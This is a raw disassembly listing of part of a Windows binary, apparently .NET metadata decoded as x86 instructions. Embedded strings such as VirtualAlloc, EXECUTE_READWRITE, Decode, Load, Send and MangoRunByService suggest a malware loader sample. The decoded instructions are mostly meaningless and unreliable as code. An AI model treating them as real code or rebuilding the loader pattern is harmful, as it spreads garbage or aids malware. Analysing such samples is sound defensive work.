   14000364c:	c6 01 81             	movb   $0x81,(%rcx)
   14000364f:	00 8e 07 3e 00 41    	add    %cl,0x41003e07(%rsi)
   140003655:	01 bb 0b d3 01 79    	add    %edi,0x7901d30b(%rbx)
   14000365b:	01 64 00 df          	add    %esp,-0x21(%rax,%rax,1)
   14000365f:	01 09                	add    %ecx,(%rcx)
   140003661:	02 02                	add    (%rdx),%al
   140003663:	09 e6                	or     %esp,%esi
   140003665:	01 09                	add    %ecx,(%rcx)
   140003667:	02 40 0d             	add    0xd(%rax),%al
   14000366a:	e9 01 09 02 e6       	jmp    0x126023f70
   14000366f:	06                   	(bad)
   140003670:	ef                   	out    %eax,(%dx)
   140003671:	01 11                	add    %edx,(%rcx)
   140003673:	02 0a                	add    (%rdx),%cl
   140003675:	0a f3                	or     %bl,%dh
   140003677:	01 19                	add    %ebx,(%rcx)
   140003679:	02 17                	add    (%rdi),%dl
   14000367b:	0d f8 01 21 02       	or     $0x22101f8,%eax
   140003680:	9a                   	(bad)
   140003681:	03 01                	add    (%rcx),%eax
   140003683:	02 19                	add    (%rcx),%bl
   140003685:	02 b5 09 0a 02 39    	add    0x39020a09(%rbp),%dh
   14000368b:	02 0a                	add    (%rdx),%cl
   14000368d:	0a 10                	or     (%rax),%dl
   14000368f:	00 e1                	add    %ah,%cl
   140003691:	00 8a 02 1b 02 e1    	add    %cl,-0x1efde4fe(%rdx)
   140003697:	00 40 0d             	add    %al,0xd(%rax)
   14000369a:	24 02                	and    $0x2,%al
   14000369c:	e1 00                	loope  0x14000369e
   14000369e:	3c 03                	cmp    $0x3,%al
   1400036a0:	06                   	(bad)
   1400036a1:	00 49 02             	add    %cl,0x2(%rcx)
   1400036a4:	ec                   	in     (%dx),%al
   1400036a5:	0c 2c                	or     $0x2c,%al
   1400036a7:	02 0e                	add    (%rsi),%cl
   1400036a9:	00 09                	add    %cl,(%rcx)
   1400036ab:	00 00                	add    %al,(%rax)
   1400036ad:	00 0e                	add    %cl,(%rsi)
   1400036af:	00 25 00 00 00 0e    	add    %ah,0xe000000(%rip)        # 0x14e0036b5
   1400036b5:	00 49 00             	add    %cl,0x0(%rcx)
   1400036b8:	00 00                	add    %al,(%rax)
   1400036ba:	09 00                	or     %eax,(%rax)
   1400036bc:	4c 00 3f             	rex.WR add %r15b,(%rdi)
   1400036bf:	02 09                	add    (%rcx),%cl
   1400036c1:	00 50 00             	add    %dl,0x0(%rax)
   1400036c4:	44 02 09             	add    (%rcx),%r9b
   1400036c7:	00 54 00 49          	add    %dl,0x49(%rax,%rax,1)
   1400036cb:	02 09                	add    (%rcx),%cl
   1400036cd:	00 58 00             	add    %bl,0x0(%rax)
   1400036d0:	4e 02 09             	rex.WRX add (%rcx),%r9b
   1400036d3:	00 5c 00 53          	add    %bl,0x53(%rax,%rax,1)
   1400036d7:	02 09                	add    (%rcx),%cl
   1400036d9:	00 60 00             	add    %ah,0x0(%rax)
   1400036dc:	58                   	pop    %rax
   1400036dd:	02 09                	add    (%rcx),%cl
   1400036df:	00 64 00 5d          	add    %ah,0x5d(%rax,%rax,1)
   1400036e3:	02 09                	add    (%rcx),%cl
   1400036e5:	00 6c 00 62          	add    %ch,0x62(%rax,%rax,1)
   1400036e9:	02 09                	add    (%rcx),%cl
   1400036eb:	00 70 00             	add    %dh,0x0(%rax)
   1400036ee:	67 02 09             	add    (%ecx),%cl
   1400036f1:	00 74 00 6c          	add    %dh,0x6c(%rax,%rax,1)
   1400036f5:	02 09                	add    (%rcx),%cl
   1400036f7:	00 78 00             	add    %bh,0x0(%rax)
   1400036fa:	71 02                	jno    0x1400036fe
   1400036fc:	09 00                	or     %eax,(%rax)
   1400036fe:	7c 00                	jl     0x140003700
   140003700:	76 02                	jbe    0x140003704
   140003702:	09 00                	or     %eax,(%rax)
   140003704:	80 00 7b             	addb   $0x7b,(%rax)
   140003707:	02 09                	add    (%rcx),%cl
   140003709:	00 84 00 80 02 09 00 	add    %al,0x90280(%rax,%rax,1)
   140003710:	88 00                	mov    %al,(%rax)
   140003712:	85 02                	test   %eax,(%rdx)
   140003714:	09 00                	or     %eax,(%rax)
   140003716:	8c 00                	mov    %es,(%rax)
   140003718:	8a 02                	mov    (%rdx),%al
   14000371a:	09 00                	or     %eax,(%rax)
   14000371c:	90                   	nop
   14000371d:	00 8f 02 09 00 94    	add    %cl,-0x6bfff6fe(%rdi)
   140003723:	00 94 02 2e 00 0b 00 	add    %dl,0xb002e(%rdx,%rax,1)
   14000372a:	70 03                	jo     0x14000372f
   14000372c:	2e 00 13             	cs add %dl,(%rbx)
   14000372f:	00 79 03             	add    %bh,0x3(%rcx)
   140003732:	2e 00 1b             	cs add %bl,(%rbx)
   140003735:	00 98 03 2e 00 23    	add    %bl,0x23002e03(%rax)
   14000373b:	00 a1 03 2e 00 2b    	add    %ah,0x2b002e03(%rcx)
   140003741:	00 b1 03 2e 00 33    	add    %dh,0x33002e03(%rcx)
   140003747:	00 b1 03 2e 00 3b    	add    %dh,0x3b002e03(%rcx)
   14000374d:	00 b1 03 2e 00 43    	add    %dh,0x43002e03(%rcx)
   140003753:	00 a1 03 2e 00 4b    	add    %ah,0x4b002e03(%rcx)
   140003759:	00 b7 03 2e 00 53    	add    %dh,0x53002e03(%rdi)
   14000375f:	00 b1 03 2e 00 5b    	add    %dh,0x5b002e03(%rcx)
   140003765:	00 b1 03 2e 00 63    	add    %dh,0x63002e03(%rcx)
   14000376b:	00 cf                	add    %cl,%bh
   14000376d:	03 2e                	add    (%rsi),%ebp
   14000376f:	00 6b 00             	add    %ch,0x0(%rbx)
   140003772:	f9                   	stc
   140003773:	03 2e                	add    (%rsi),%ebp
   140003775:	00 73 00             	add    %dh,0x0(%rbx)
   140003778:	06                   	(bad)
   140003779:	04 61                	add    $0x61,%al
   14000377b:	00 7b 00             	add    %bh,0x0(%rbx)
   14000377e:	76 02                	jbe    0x140003782
   140003780:	03 01                	add    (%rcx),%eax
   140003782:	7b 00                	jnp    0x140003784
   140003784:	76 02                	jbe    0x140003788
   140003786:	23 01                	and    (%rcx),%eax
   140003788:	7b 00                	jnp    0x14000378a
   14000378a:	76 02                	jbe    0x14000378e
   14000378c:	43 01 8b 00 98 03 63 	rex.XB add %ecx,0x63039800(%r11)
   140003793:	01 93 00 76 02 83    	add    %edx,-0x7cfd8a00(%rbx)
   140003799:	01 93 00 76 02 e0    	add    %edx,-0x1ffd8a00(%rbx)
   14000379f:	01 7b 00             	add    %edi,0x0(%rbx)
   1400037a2:	76 02                	jbe    0x1400037a6
   1400037a4:	00 02                	add    %al,(%rdx)
   1400037a6:	7b 00                	jnp    0x1400037a8
   1400037a8:	76 02                	jbe    0x1400037ac
   1400037aa:	01 00                	add    %eax,(%rax)
   1400037ac:	1a 00                	sbb    (%rax),%al
   1400037ae:	00 00                	add    %al,(%rax)
   1400037b0:	0d 00 01 00 1e       	or     $0x1e000100,%eax
   1400037b5:	00 00                	add    %al,(%rax)
   1400037b7:	00 0e                	add    %cl,(%rsi)
   1400037b9:	00 01                	add    %al,(%rcx)
   1400037bb:	00 00                	add    %al,(%rax)
   1400037bd:	08 00                	or     %al,(%rax)
   1400037bf:	00 0f                	add    %cl,(%rdi)
   1400037c1:	00 20                	add    %ah,(%rax)
   1400037c3:	00 51 00             	add    %dl,0x0(%rcx)
   1400037c6:	99                   	cltd
   1400037c7:	00 a9 00 c3 00 e8    	add    %ch,-0x17ff3d00(%rcx)
   1400037cd:	00 07                	add    %al,(%rdi)
   1400037cf:	01 3f                	add    %edi,(%rdi)
   1400037d1:	01 44 01 86          	add    %eax,-0x7a(%rcx,%rax,1)
   1400037d5:	01 96 01 9c 01 b0    	add    %edx,-0x4ffe63ff(%rsi)
   1400037db:	01 cc                	add    %ecx,%esp
   1400037dd:	01 da                	add    %ebx,%edx
   1400037df:	01 14 02             	add    %edx,(%rdx,%rax,1)
   1400037e2:	05 00 01 00 00       	add    $0x100,%eax
   1400037e7:	00 8e 09 6b 03 02    	add    %cl,0x2036b09(%rsi)
   1400037ed:	00 0f                	add    %cl,(%rdi)
   1400037ef:	00 03                	add    %al,(%rbx)
   1400037f1:	00 01                	add    %al,(%rcx)
   1400037f3:	00 10                	add    %dl,(%rax)
   1400037f5:	00 03                	add    %al,(%rbx)
   1400037f7:	00 06                	add    %al,(%rsi)
   1400037f9:	00 24 00             	add    %ah,(%rax,%rax,1)
   1400037fc:	21 00                	and    %eax,(%rax)
   1400037fe:	07                   	(bad)
   1400037ff:	00 38                	add    %bh,(%rax)
   140003801:	00 21                	add    %ah,(%rcx)
   140003803:	00 e8                	add    %ch,%al
   140003805:	07                   	(bad)
   140003806:	5b                   	pop    %rbx
   140003807:	00 76 00             	add    %dh,0x0(%rsi)
   14000380a:	9d                   	popf
   14000380b:	00 40 01             	add    %al,0x1(%rax)
   14000380e:	4d 00 83 02 01 00 00 	rex.WRB add %r8b,0x102(%r11)
   140003815:	01 4f 00             	add    %ecx,0x0(%rdi)
   140003818:	35 03 02 00 8a       	xor    $0x8a000203,%eax
   14000381d:	4d 00 00             	rex.WRB add %r8b,(%r8)
   140003820:	0e                   	(bad)
   140003821:	00 aa 4d 00 00 0f    	add    %ch,0xf00004d(%rdx)
   140003827:	00 ca                	add    %cl,%dl
   140003829:	4d 00 00             	rex.WRB add %r8b,(%r8)
   14000382c:	10 00                	adc    %al,(%rax)
   14000382e:	04 80                	add    $0x80,%al
   140003830:	00 00                	add    %al,(%rax)
   140003832:	01 00                	add    %eax,(%rax)
	...
   140003840:	28 09                	sub    %cl,(%rcx)
   140003842:	00 00                	add    %al,(%rax)
   140003844:	04 00                	add    $0x0,%al
	...
   14000384e:	00 00                	add    %al,(%rax)
   140003850:	36 02 5f 02          	ss add 0x2(%rdi),%bl
   140003854:	00 00                	add    %al,(%rax)
   140003856:	00 00                	add    %al,(%rax)
   140003858:	04 00                	add    $0x0,%al
	...
   140003862:	00 00                	add    %al,(%rax)
   140003864:	36 02 06             	ss add (%rsi),%al
   140003867:	08 00                	or     %al,(%rax)
   140003869:	00 00                	add    %al,(%rax)
   14000386b:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   140003876:	00 00                	add    %al,(%rax)
   140003878:	36 02 b1 04 00 00 00 	ss add 0x4(%rcx),%dh
   14000387f:	00 09                	add    %cl,(%rcx)
   140003881:	00 02                	add    %al,(%rdx)
   140003883:	00 0a                	add    %cl,(%rdx)
   140003885:	00 07                	add    %al,(%rdi)
   140003887:	00 0b                	add    %cl,(%rbx)
   140003889:	00 07                	add    %al,(%rdi)
   14000388b:	00 0c 00             	add    %cl,(%rax,%rax,1)
   14000388e:	07                   	(bad)
   14000388f:	00 0d 00 08 00 0e    	add    %cl,0xe000800(%rip)        # 0x14e004095
   140003895:	00 08                	add    %cl,(%rax)
   140003897:	00 0f                	add    %cl,(%rdi)
   140003899:	00 08                	add    %cl,(%rax)
   14000389b:	00 49 00             	add    %cl,0x0(%rcx)
   14000389e:	71 00                	jno    0x1400038a0
   1400038a0:	4d 00 71 00          	rex.WRB add %r14b,0x0(%r9)
   1400038a4:	00 00                	add    %al,(%rax)
   1400038a6:	00 00                	add    %al,(%rax)
   1400038a8:	00 5f 5f             	add    %bl,0x5f(%rdi)
   1400038ab:	53                   	push   %rbx
   1400038ac:	74 61                	je     0x14000390f
   1400038ae:	74 69                	je     0x140003919
   1400038b0:	63 41 72             	movsxd 0x72(%rcx),%eax
   1400038b3:	72 61                	jb     0x140003916
   1400038b5:	79 49                	jns    0x140003900
   1400038b7:	6e                   	outsb  (%rsi),(%dx)
   1400038b8:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%rsp,%rdx,2),%esi
   1400038bf:	69 
   1400038c0:	7a 65                	jp     0x140003927
   1400038c2:	3d 33 30 00 3c       	cmp    $0x3c003033,%eax
   1400038c7:	3e 63 5f 5f          	ds movsxd 0x5f(%rdi),%ebx
   1400038cb:	44 69 73 70 6c 61 79 	imul   $0x4379616c,0x70(%rbx),%r14d
   1400038d2:	43 
   1400038d3:	6c                   	insb   (%dx),(%rdi)
   1400038d4:	61                   	(bad)
   1400038d5:	73 73                	jae    0x14000394a
   1400038d7:	36 5f                	ss pop %rdi
   1400038d9:	30 00                	xor    %al,(%rax)
   1400038db:	3c 49                	cmp    $0x49,%al
   1400038dd:	73 45                	jae    0x140003924
   1400038df:	78 69                	js     0x14000394a
   1400038e1:	73 74                	jae    0x140003957
   1400038e3:	47 75 61             	rex.RXB jne 0x140003947
   1400038e6:	72 64                	jb     0x14000394c
   1400038e8:	3e 62 5f 5f 30 00    	(bad)
   1400038ee:	49                   	rex.WB
   1400038ef:	45 6e                	rex.RB outsb (%rsi),(%dx)
   1400038f1:	75 6d                	jne    0x140003960
   1400038f3:	65 72 61             	gs jb  0x140003957
   1400038f6:	62 6c 65 60 31       	(bad)
   1400038fb:	00 4c 69 73          	add    %cl,0x73(%rcx,%rbp,2)
   1400038ff:	74 60                	je     0x140003961
   140003901:	31 00                	xor    %eax,(%rax)
   140003903:	6b 65 72 6e          	imul   $0x6e,0x72(%rbp),%esp
   140003907:	65 6c                	gs insb (%dx),(%rdi)
   140003909:	33 32                	xor    (%rdx),%esi
   14000390b:	00 54 6f 55          	add    %dl,0x55(%rdi,%rbp,2)
   14000390f:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140003911:	74 33                	je     0x140003946
   140003913:	32 00                	xor    (%rax),%al
   140003915:	54                   	push   %rsp
   140003916:	6f                   	outsl  (%rsi),(%dx)
   140003917:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140003919:	74 33                	je     0x14000394e
   14000391b:	32 00                	xor    (%rax),%al
   14000391d:	46 75 6e             	rex.RX jne 0x14000398e
   140003920:	63 60 32             	movsxd 0x32(%rax),%esp
   140003923:	00 55 49             	add    %dl,0x49(%rbp)
   140003926:	6e                   	outsb  (%rsi),(%dx)
   140003927:	74 36                	je     0x14000395f
   140003929:	34 00                	xor    $0x0,%al
   14000392b:	5f                   	pop    %rdi
   14000392c:	5f                   	pop    %rdi
   14000392d:	53                   	push   %rbx
   14000392e:	74 61                	je     0x140003991
   140003930:	74 69                	je     0x14000399b
   140003932:	63 41 72             	movsxd 0x72(%rcx),%eax
   140003935:	72 61                	jb     0x140003998
   140003937:	79 49                	jns    0x140003982
   140003939:	6e                   	outsb  (%rsi),(%dx)
   14000393a:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%rsp,%rdx,2),%esi
   140003941:	69 
   140003942:	7a 65                	jp     0x1400039a9
   140003944:	3d 32 36 00 35       	cmp    $0x35003632,%eax
   140003949:	30 44 45 44          	xor    %al,0x44(%rbp,%rax,2)
   14000394d:	33 39                	xor    (%rcx),%edi
   14000394f:	30 31                	xor    %dh,(%rcx)
   140003951:	31 39                	xor    %edi,(%rcx)
   140003953:	46 30 36             	rex.RX xor %r14b,(%rsi)
   140003956:	41 39 42 33          	cmp    %eax,0x33(%r10)
   14000395a:	46 30 37             	rex.RX xor %r14b,(%rdi)
   14000395d:	35 32 31 45 37       	xor    $0x37453132,%eax
   140003962:	34 46                	xor    $0x46,%al
   140003964:	42                   	rex.X
   140003965:	36 41                	ss rex.B
   140003967:	36 46                	ss rex.RX
   140003969:	42 32 41 32          	rex.X xor 0x32(%rcx),%al
   14000396d:	37                   	(bad)
   14000396e:	41 30 44 42 45       	xor    %al,0x45(%r10,%rax,2)
   140003973:	36 30 32             	ss xor %dh,(%rdx)
   140003976:	31 42 45             	xor    %eax,0x45(%rdx)
   140003979:	32 34 41             	xor    (%rcx,%rax,2),%dh
   14000397c:	34 36                	xor    $0x36,%al
   14000397e:	46 33 45 43          	rex.RX xor 0x43(%rbp),%r8d
   140003982:	37                   	(bad)
   140003983:	45                   	rex.RB
   140003984:	41 34 42             	rex.B xor $0x42,%al
   140003987:	37                   	(bad)
   140003988:	00 5f 5f             	add    %bl,0x5f(%rdi)
   14000398b:	53                   	push   %rbx
   14000398c:	74 61                	je     0x1400039ef
   14000398e:	74 69                	je     0x1400039f9
   140003990:	63 41 72             	movsxd 0x72(%rcx),%eax
   140003993:	72 61                	jb     0x1400039f6
   140003995:	79 49                	jns    0x1400039e0
   140003997:	6e                   	outsb  (%rsi),(%dx)
   140003998:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%rsp,%rdx,2),%esi
   14000399f:	69 
   1400039a0:	7a 65                	jp     0x140003a07
   1400039a2:	3d 32 30 34 38       	cmp    $0x38343032,%eax
   1400039a7:	00 67 65             	add    %ah,0x65(%rdi)
   1400039aa:	74 5f                	je     0x140003a0b
   1400039ac:	55                   	push   %rbp
   1400039ad:	54                   	push   %rsp
   1400039ae:	46 38 00             	rex.RX cmp %r8b,(%rax)
   1400039b1:	3c 4d                	cmp    $0x4d,%al
   1400039b3:	6f                   	outsl  (%rsi),(%dx)
   1400039b4:	64 75 6c             	fs jne 0x140003a23
   1400039b7:	65 3e 00 3c 50       	gs add %bh,%gs:(%rax,%rdx,2)
   1400039bc:	72 69                	jb     0x140003a27
   1400039be:	76 61                	jbe    0x140003a21
   1400039c0:	74 65                	je     0x140003a27
   1400039c2:	49 6d                	rex.WB insl (%dx),(%rdi)
   1400039c4:	70 6c                	jo     0x140003a32
   1400039c6:	65 6d                	gs insl (%dx),(%rdi)
   1400039c8:	65 6e                	outsb  %gs:(%rsi),(%dx)
   1400039ca:	74 61                	je     0x140003a2d
   1400039cc:	74 69                	je     0x140003a37
   1400039ce:	6f                   	outsl  (%rsi),(%dx)
   1400039cf:	6e                   	outsb  (%rsi),(%dx)
   1400039d0:	44                   	rex.R
   1400039d1:	65 74 61             	gs je  0x140003a35
   1400039d4:	69 6c 73 3e 00 41 31 	imul   $0x45314100,0x3e(%rbx,%rsi,2),%ebp
   1400039db:	45 
   1400039dc:	41                   	rex.B
   1400039dd:	42                   	rex.X
   1400039de:	43                   	rex.XB
   1400039df:	41 35 32 31 32 38    	rex.B xor $0x38323132,%eax
   1400039e5:	39 36                	cmp    %esi,(%rsi)
   1400039e7:	43                   	rex.XB
   1400039e8:	43 37                	rex.XB (bad)
   1400039ea:	39 31                	cmp    %esi,(%rcx)
   1400039ec:	46                   	rex.RX
   1400039ed:	43 31 30             	rex.XB xor %esi,(%r8)
   1400039f0:	32 30                	xor    (%rax),%dh
   1400039f2:	39 43 46             	cmp    %eax,0x46(%rbx)
   1400039f5:	31 44 45 31          	xor    %eax,0x31(%rbp,%rax,2)
   1400039f9:	31 34 30             	xor    %esi,(%rax,%rsi,1)
   1400039fc:	44 38 31             	cmp    %r14b,(%rcx)
   1400039ff:	41 32 38             	xor    (%r8),%dil
   140003a02:	37                   	(bad)
   140003a03:	34 34                	xor    $0x34,%al
   140003a05:	46                   	rex.RX
   140003a06:	45 37                	rex.RB (bad)
   140003a08:	36 42                	ss rex.X
   140003a0a:	42 30 33             	rex.X xor %sil,(%rbx)
   140003a0d:	42                   	rex.X
   140003a0e:	44                   	rex.R
   140003a0f:	45                   	rex.RB
   140003a10:	44 37                	rex.R (bad)
   140003a12:	34 30                	xor    $0x30,%al
   140003a14:	46 35 43 39 43 00    	rex.RX xor $0x433943,%eax
   140003a1a:	47                   	rex.RXB
   140003a1b:	65 74 43             	gs je  0x140003a61
   140003a1e:	6f                   	outsl  (%rsi),(%dx)
   140003a1f:	6d                   	insl   (%dx),(%rdi)
   140003a20:	70 75                	jo     0x140003a97
   140003a22:	74 65                	je     0x140003a89
   140003a24:	72 4e                	jb     0x140003a74
   140003a26:	61                   	(bad)
   140003a27:	6d                   	insl   (%dx),(%rdi)
   140003a28:	65 43 52             	gs rex.XB push %r10
   140003a2b:	43 00 47 65          	rex.XB add %al,0x65(%r15)
   140003a2f:	74 43                	je     0x140003a74
   140003a31:	52                   	push   %rdx
   140003a32:	43 00 45 58          	rex.XB add %al,0x58(%r13)
   140003a36:	45                   	rex.RB
   140003a37:	43 55                	rex.XB push %r13
   140003a39:	54                   	push   %rsp
   140003a3a:	45 5f                	rex.RB pop %r15
   140003a3c:	52                   	push   %rdx
   140003a3d:	45                   	rex.RB
   140003a3e:	41                   	rex.B
   140003a3f:	44 00 45 58          	add    %r8b,0x58(%rbp)
   140003a43:	45                   	rex.RB
   140003a44:	43 55                	rex.XB push %r13
   140003a46:	54                   	push   %rsp
   140003a47:	45 5f                	rex.RB pop %r15
   140003a49:	52                   	push   %rdx
   140003a4a:	45                   	rex.RB
   140003a4b:	41                   	rex.B
   140003a4c:	44 57                	rex.R push %rdi
   140003a4e:	52                   	push   %rdx
   140003a4f:	49 54                	rex.WB push %r12
   140003a51:	45 00 45 58          	add    %r8b,0x58(%r13)
   140003a55:	45                   	rex.RB
   140003a56:	43 55                	rex.XB push %r13
   140003a58:	54                   	push   %rsp
   140003a59:	45 00 52 45          	add    %r10b,0x45(%r10)
   140003a5d:	53                   	push   %rbx
   140003a5e:	45 52                	rex.RB push %r10
   140003a60:	56                   	push   %rsi
   140003a61:	45 00 37             	add    %r14b,(%r15)
   140003a64:	44                   	rex.R
   140003a65:	46 35 39 39 41 34    	rex.RX xor $0x34413939,%eax
   140003a6b:	46 39 37             	rex.RX cmp %r14d,(%rdi)
   140003a6e:	44                   	rex.R
   140003a6f:	36 45                	ss rex.RB
   140003a71:	36 31 33             	ss xor %esi,(%rbx)
   140003a74:	38 41 45             	cmp    %al,0x45(%rcx)
   140003a77:	30 46 41             	xor    %al,0x41(%rsi)
   140003a7a:	36 32 34 41          	ss xor (%rcx,%rax,2),%dh
   140003a7e:	43 37                	rex.XB (bad)
   140003a80:	41 35 31 37 31 36    	rex.B xor $0x36313731,%eax
   140003a86:	32 31                	xor    (%rcx),%dh
   140003a88:	45                   	rex.RB
   140003a89:	46                   	rex.RX
   140003a8a:	43 31 44 42 37       	xor    %eax,0x37(%r10,%r8,2)
   140003a8f:	44                   	rex.R
   140003a90:	46 31 30             	rex.RX xor %r14d,(%rax)
   140003a93:	34 32                	xor    $0x32,%al
   140003a95:	42                   	rex.X
   140003a96:	46 30 38             	rex.RX xor %r15b,(%rax)
   140003a99:	38 46 44             	cmp    %al,0x44(%rsi)
   140003a9c:	45 38 31             	cmp    %r14b,(%r9)
   140003a9f:	35 41 42 46 00       	xor    $0x464241,%eax
   140003aa4:	57                   	push   %rdi
   140003aa5:	52                   	push   %rdx
   140003aa6:	49 54                	rex.WB push %r12
   140003aa8:	45 5f                	rex.RB pop %r15
   140003aaa:	57                   	push   %rdi
   140003aab:	41 54                	push   %r12
   140003aad:	43                   	rex.XB
   140003aae:	48 00 50 48          	rex.W add %dl,0x48(%rax)
   140003ab2:	59                   	pop    %rcx
   140003ab3:	53                   	push   %rbx
   140003ab4:	49                   	rex.WB
   140003ab5:	43                   	rex.XB
   140003ab6:	41                   	rex.B
   140003ab7:	4c 00 54 4f 50       	rex.WR add %r10b,0x50(%rdi,%rcx,2)
   140003abc:	5f                   	pop    %rdi
   140003abd:	44                   	rex.R
   140003abe:	4f 57                	rex.WRXB push %r15
   140003ac0:	4e 00 4c 41 52       	rex.WRX add %r9b,0x52(%rcx,%r8,2)
   140003ac5:	47                   	rex.RXB
   140003ac6:	45 5f                	rex.RB pop %r15
   140003ac8:	50                   	push   %rax
   140003ac9:	41                   	rex.B
   140003aca:	47                   	rex.RXB
   140003acb:	45 53                	rex.RB push %r11
   140003acd:	00 4e 4f             	add    %cl,0x4f(%rsi)
   140003ad0:	41                   	rex.B
   140003ad1:	43                   	rex.XB
   140003ad2:	43                   	rex.XB
   140003ad3:	45 53                	rex.RB push %r11
   140003ad5:	53                   	push   %rbx
   140003ad6:	00 52 45             	add    %dl,0x45(%rdx)
   140003ad9:	53                   	push   %rbx
   140003ada:	45 54                	rex.RB push %r12
   140003adc:	00 43 4f             	add    %al,0x4f(%rbx)
   140003adf:	4d                   	rex.WRB
   140003ae0:	4d                   	rex.WRB
   140003ae1:	49 54                	rex.WB push %r12
   140003ae3:	00 52 45             	add    %dl,0x45(%rdx)
   140003ae6:	41                   	rex.B
   140003ae7:	44                   	rex.R
   140003ae8:	4f                   	rex.WRXB
   140003ae9:	4e                   	rex.WRX
   140003aea:	4c 59                	rex.WR pop %rcx
   140003aec:	00 45 58             	add    %al,0x58(%rbp)
   140003aef:	45                   	rex.RB
   140003af0:	43 55                	rex.XB push %r13
   140003af2:	54                   	push   %rsp
   140003af3:	45 5f                	rex.RB pop %r15
   140003af5:	57                   	push   %rdi
   140003af6:	52                   	push   %rdx
   140003af7:	49 54                	rex.WB push %r12
   140003af9:	45                   	rex.RB
   140003afa:	43                   	rex.XB
   140003afb:	4f 50                	rex.WRXB push %r8
   140003afd:	59                   	pop    %rcx
   140003afe:	00 76 61             	add    %dh,0x61(%rsi)
   140003b01:	6c                   	insb   (%dx),(%rdi)
   140003b02:	75 65                	jne    0x140003b69
   140003b04:	5f                   	pop    %rdi
   140003b05:	5f                   	pop    %rdi
   140003b06:	00 6d 73             	add    %ch,0x73(%rbp)
   140003b09:	63 6f 72             	movsxd 0x72(%rdi),%ebp
   140003b0c:	6c                   	insb   (%dx),(%rdi)
   140003b0d:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%rdx),%esp
   140003b14:	65 6d                	gs insl (%dx),(%rdi)
   140003b16:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140003b19:	6c                   	insb   (%dx),(%rdi)
   140003b1a:	6c                   	insb   (%dx),(%rdi)
   140003b1b:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140003b20:	6e                   	outsb  (%rsi),(%dx)
   140003b21:	73 2e                	jae    0x140003b51
   140003b23:	47                   	rex.RXB
   140003b24:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140003b26:	65 72 69             	gs jb  0x140003b92
   140003b29:	63 00                	movsxd (%rax),%eax
   140003b2b:	56                   	push   %rsi
   140003b2c:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%rdx),%esi
   140003b33:	6c                   	insb   (%dx),(%rdi)
   140003b34:	6c                   	insb   (%dx),(%rdi)
   140003b35:	6f                   	outsl  (%rsi),(%dx)
   140003b36:	63 00                	movsxd (%rax),%eax
   140003b38:	67 65 74 5f          	addr32 gs je 0x140003b9b
   140003b3c:	49                   	rex.WB
   140003b3d:	64 00 47 65          	add    %al,%fs:0x65(%rdi)
   140003b41:	74 43                	je     0x140003b86
   140003b43:	70 75                	jo     0x140003bba
   140003b45:	49                   	rex.WB
   140003b46:	64 00 47 65          	add    %al,%fs:0x65(%rdi)
   140003b4a:	74 50                	je     0x140003b9c
   140003b4c:	72 6f                	jb     0x140003bbd
   140003b4e:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003b51:	73 42                	jae    0x140003b95
   140003b53:	79 49                	jns    0x140003b9e
   140003b55:	64 00 54 68 72       	add    %dl,%fs:0x72(%rax,%rbp,2)
   140003b5a:	65 61                	gs (bad)
   140003b5c:	64 00 4c 6f 61       	add    %cl,%fs:0x61(%rdi,%rbp,2)
   140003b61:	64 00 41 64          	add    %al,%fs:0x64(%rcx)
   140003b65:	64 00 67 65          	add    %ah,%fs:0x65(%rdi)
   140003b69:	74 5f                	je     0x140003bca
   140003b6b:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140003b6d:	6e                   	outsb  (%rsi),(%dx)
   140003b6e:	6e                   	outsb  (%rsi),(%dx)
   140003b6f:	65 63 74 65 64       	movsxd %gs:0x64(%rbp,%riz,2),%esi
   140003b74:	00 53 50             	add    %dl,0x50(%rbx)
   140003b77:	69 64 00 47 65 74 47 	imul   $0x75477465,0x47(%rax,%rax,1),%esp
   140003b7e:	75 
   140003b7f:	69 64 00 3c 42 75 66 	imul   $0x66667542,0x3c(%rax,%rax,1),%esp
   140003b86:	66 
   140003b87:	65 72 3e             	gs jb  0x140003bc8
   140003b8a:	6b 5f 5f 42          	imul   $0x42,0x5f(%rdi),%ebx
   140003b8e:	61                   	(bad)
   140003b8f:	63 6b 69             	movsxd 0x69(%rbx),%ebp
   140003b92:	6e                   	outsb  (%rsi),(%dx)
   140003b93:	67 46 69 65 6c 64 00 	rex.RX imul $0x65530064,0x6c(%ebp),%r12d
   140003b9a:	53 65 
   140003b9c:	6e                   	outsb  (%rsi),(%dx)
   140003b9d:	64 00 6d 65          	add    %ch,%fs:0x65(%rbp)
   140003ba1:	74 68                	je     0x140003c0b
   140003ba3:	6f                   	outsl  (%rsi),(%dx)
   140003ba4:	64 00 49 73          	add    %cl,%fs:0x73(%rcx)
   140003ba8:	45 78 69             	rex.RB js 0x140003c14
   140003bab:	73 74                	jae    0x140003c21
   140003bad:	47 75 61             	rex.RXB jne 0x140003c11
   140003bb0:	72 64                	jb     0x140003c16
   140003bb2:	00 4e 65             	add    %cl,0x65(%rsi)
   140003bb5:	74 77                	je     0x140003c2e
   140003bb7:	6f                   	outsl  (%rsi),(%dx)
   140003bb8:	72 6b                	jb     0x140003c25
   140003bba:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140003bbc:	74 65                	je     0x140003c23
   140003bbe:	72 66                	jb     0x140003c26
   140003bc0:	61                   	(bad)
   140003bc1:	63 65 00             	movsxd 0x0(%rbp),%esp
   140003bc4:	4d 61                	rex.WRB (bad)
   140003bc6:	6e                   	outsb  (%rsi),(%dx)
   140003bc7:	67 6f                	outsl  (%esi),(%dx)
   140003bc9:	52                   	push   %rdx
   140003bca:	75 6e                	jne    0x140003c3a
   140003bcc:	42 79 53             	rex.X jns 0x140003c22
   140003bcf:	65 72 76             	gs jb  0x140003c48
   140003bd2:	69 63 65 00 44 65 63 	imul   $0x63654400,0x65(%rbx),%esp
   140003bd9:	6f                   	outsl  (%rsi),(%dx)
   140003bda:	64 65 00 56 69       	fs add %dl,%gs:0x69(%rsi)
   140003bdf:	72 74                	jb     0x140003c55
